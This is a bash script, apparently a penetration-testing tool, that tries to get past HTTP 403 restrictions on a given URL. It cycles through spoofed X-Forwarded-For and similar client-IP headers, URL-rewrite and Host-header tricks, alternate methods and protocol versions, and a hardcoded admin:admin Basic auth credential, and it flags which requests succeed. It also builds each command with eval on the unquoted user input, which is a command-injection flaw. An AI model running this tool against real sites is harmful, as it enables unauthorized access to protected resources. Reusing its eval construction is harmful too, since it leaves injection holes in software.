#!/bin/bash

# Usage: ./403bypass.sh <URL>
URL=$1

# Color codes for output
RED="\033[31m"
GREEN="\033[32m"
RESET="\033[0m"

if [ -z "$URL" ]; then
  echo "Usage: $0 <URL>"
  exit 1
fi

# Payloads
declare -a payloads=(
    "-H 'X-Forwarded-For: 127.0.0.1'"
    "-H 'X-Forwarded-For: 127.0.0.2'"
    "-H 'X-Forwarded-For: 10.0.0.1'"
    "-H 'X-Forwarded-For: 192.168.0.1'"
    "-H 'X-Client-IP: 127.0.0.1'"
    "-H 'X-Client-IP: 192.168.0.1'"
    "-H 'X-Real-IP: 127.0.0.1'"
    "-H 'X-Originating-IP: 127.0.0.1'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
    "-H 'Forwarded: for=127.0.0.1;proto=http;by=127.0.0.1'"
    "-H 'X-Original-URL: /'"
    "-H 'X-Rewrite-URL: /'"
    "-H 'Referer: $URL'"
    "-H 'X-Host: localhost'"
    "-H 'X-Forwarded-Host: localhost'"
    "-H 'X-Original-Host: $URL'"
    "-H 'X-Wap-Profile: localhost'"
    "-H 'X-Forwarded-Proto: https'"
    "-H 'X-Forwarded-Proto: http'"
    "-H 'X-Forwarded-For: 10.10.10.10'"
    "-X GET"
    "-X POST"
    "-X HEAD"
    "-X PUT"
    "-X DELETE"
    "--resolve example.com:80:127.0.0.1"
    "--resolve example.com:443:127.0.0.1"
    "--resolve example.com:8080:127.0.0.1"
    "--resolve example.com:8443:127.0.0.1"
    "-H 'Host: 127.0.0.1:80'"
    "--http1.0"
    "--http1.1"
    "--http2"
    "-H 'Upgrade-Insecure-Requests: 1'"
    "-H 'X-Forwarded-Scheme: http'"
    "-H 'Cache-Control: no-cache'"
    "-H 'Authorization: Basic YWRtaW46YWRtaW4='"
    "-H 'If-Modified-Since: Sat, 1 Jan 2022 00:00:00 GMT'"
    "-H 'Accept: */*'"
    "-H 'X-Requested-With: XMLHttpRequest'"
)

# Start bypass attempts
for payload in "${payloads[@]}"
do
    # Perform the request and store status code and content length
    curl_output=$(eval "curl -s -o /dev/null -w '%{http_code},%{size_download}' $payload $URL")
    
    # Extract status code and length from output
    status_code=$(echo $curl_output | cut -d',' -f1)
    length=$(echo $curl_output | cut -d',' -f2)

    # Determine color based on status code
    if [[ "$status_code" == "200" || "$status_code" == "301" || "$status_code" == "302" ]]; then
        color=$GREEN
    else
        color=$RED
    fi

    # Print output in single line with color
    echo -e "curl $payload $URL -> ${color}${status_code} , ${length}${RESET}"
done
